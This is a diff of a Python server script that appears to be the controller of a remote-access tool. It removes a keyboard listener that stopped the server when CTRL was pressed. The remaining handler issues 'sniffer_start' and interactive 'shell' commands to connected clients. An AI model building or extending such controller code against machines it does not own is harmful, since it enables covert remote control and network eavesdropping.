@@ -13,30 +13,10 @@ import os
 init(autoreset=True)
 
 app = Flask(__name__)
-ctrl_pressed = False
 clients = {}
 server_thread = None
 
-def on_press(key):
-    global ctrl_pressed
-    try:
-        if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
-            ctrl_pressed = True  
-            print(Fore.YELLOW + "CTRL pressed!")
-            print(Fore.RED + "[ * ] CTRL detected! Stopping server...")
-            stop_server()
-            return False  # To stop the listener after CTRL is pressed
-    except AttributeError:
-        pass
 
-def on_release(key):
-    global ctrl_pressed
-    if key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
-        ctrl_pressed = False  
-
-def listen_for_ctrl_p():
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
 
 def start_streaming(client_socket, mode):
     print(Fore.BLUE + "[ * ] Starting...")
@@ -81,11 +61,7 @@ def handle_client(client_socket, addr):
 
         if command == "sniffer_start":
             print(Fore.YELLOW + "[ * ] Starting network sniffer on client...")
-
-        if command == "CTRL+P":  
-            print(Fore.RED + "[ * ] Server will be stopped after CTRL+P")
-            continue
-
+            
         if command == "shell":
             print(Fore.YELLOW + "[ * ] Entering interactive shell mode. Type 'exit' to leave.")
             while True:
